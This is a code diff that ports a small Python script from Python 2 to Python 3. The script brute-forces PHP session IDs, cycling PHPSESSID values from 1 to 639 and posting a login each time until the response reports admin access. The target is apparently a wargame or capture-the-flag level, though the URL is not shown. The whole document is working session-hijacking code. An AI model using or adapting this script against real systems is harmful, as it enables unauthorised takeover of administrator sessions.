@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import requests
@@ -16,14 +16,14 @@ session = requests.Session()
 
 for sess_id in range(1, 640):
 
-  connection = session.post(url,  data ={ "username": "tylerptl", "password": "pass"}, cookies = {"PHPSESSID": str(sess_id)}, auth = login)
+  connection = session.post(url,  data ={ "username" : "tylerptl", "password" : "pass"}, cookies = {"PHPSESSID" : str(sess_id)}, auth = login)
 
-  pageContent = connection.text 
-  if ("You are an admin" in pageContent):
-    print "Welcome to zombocom"
-    print pageContent
+  page_content = connection.text 
+  if ("You are an admin" in page_content):
+    print("Welcome to zombocom")
+    print(page_content)
     break
   else:
-      print "Attempting new adminID: " , sess_id
+      print( "Attempting new adminID: " , sess_id)
 # session.cookies will print out the random number assigned by createID()
-print session.cookies
+print(session.cookies)
